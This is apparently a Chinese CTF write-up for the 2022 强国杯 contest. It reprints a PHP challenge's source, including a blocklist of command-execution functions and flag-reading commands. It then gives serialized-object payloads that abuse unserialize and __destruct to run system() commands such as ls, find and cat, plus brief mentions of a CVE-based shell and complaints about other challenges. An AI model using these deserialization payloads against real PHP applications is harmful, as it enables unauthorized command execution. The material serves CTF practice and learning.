# 2022 强国杯 WP



## Execute command

套皮 CVE，直接验证可以目录遍历，可以命令执行的情况下，弹 shell；



直接拿到 shell 就可以了？？？作为签到题我不说什么。但是起码的，加个提权会更有意思吧呵呵，都不知道单纯学一个套皮 CVE 意义何在。



## guomi

**评价这个题目，guomi 和题目一点关系都没有，脑洞垃圾题**



提交123可以得到hint

![image](C:/Users/VanHurts/Documents/WeChat Files/wxid_3yfq8f7cxld822/FileStorage/File/2022-10/assets/image-20221009165112-0go0vto.png)​

根据国密算法 输入123123可以进入

进入后在post处可以发现传参 发现函数执行 

可以使用`highlight_file`获取源码

```java
<!DOCTYPE html>
<html lang="zh-CN">
<title>真的是空白</title>
<head>
    <meta charset="utf-8">
    <style type="text/css">
        body {
            background: url("aa.png") no-repeat;
            background-size: 100%;
        }
        p {
            color: white;
        }
    </style>
</head>

<body>
<script language=javascript>
    setTimeout("document.form1.submit()",5000)
</script>
<p>
    <?php
    $disable_fun = array("file_get_contents","exec","shell_exec","system","ls","passthru","proc_open","cat /tmp/flagqlklg","tac /tmp/flagqlklg","more /tmp/flagqlklg","less /tmp/flagqlklg","show_source","phpinfo","popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk",  "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce","array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents");
    function gettime($func, $p) {
        $result = call_user_func($func, $p);
        $a= gettype($result);
        if ($a == "string") {
            return $result;
        } else {return "";}
    }
    class Test {
        var $p = "Y-m-d h:i:s a";
        var $func = "date";
        function __destruct() {
            if ($this->func != "") {
                echo gettime($this->func, $this->p);
            }
        }
    }
    $func = $_REQUEST["func"];
    $p = $_REQUEST["p"];

    if ($func != null) {
        $func = strtolower($func);
    if (!in_array($func,$disable_fun)) {
        if (!in_array($p,$disable_fun)){
        echo gettime($func,$p);
        }else{
        die("you are Hacker....");
        }
            #echo gettime($func, $p);
        }else {
            die("you are Hacker...");
        }
    }
    ?>
</p>
<form  id=form1 name=form1 action="guomi.php" method=post>
    <input type=hidden id=func name=func value='date'>
    <input type=hidden id=p name=p value='Y-m-d h:i:s a'>
</body>
</html>
```

其中存在反序列化 尝试构造

```java
func=unserialize&p=O:4:"Test":2:{s:4:"func";s:6:"system";s:1:"p";s:2:"ls";}
```



找flag

```java
func=unserialize&p=O:4:"Test":2:{s:4:"func";s:6:"system";s:1:"p";s:18:"find / -name flag*";}
```



读取flag

```java
func=unserialize&p=O:4:"Test":2:{s:1:"p";s:18:"cat /tmp/flagqlklg";s:4:"func";s:6:"system";}
```



## 葫芦娃

评价：脑洞垃圾题





## ikun

评价：脑洞垃圾题

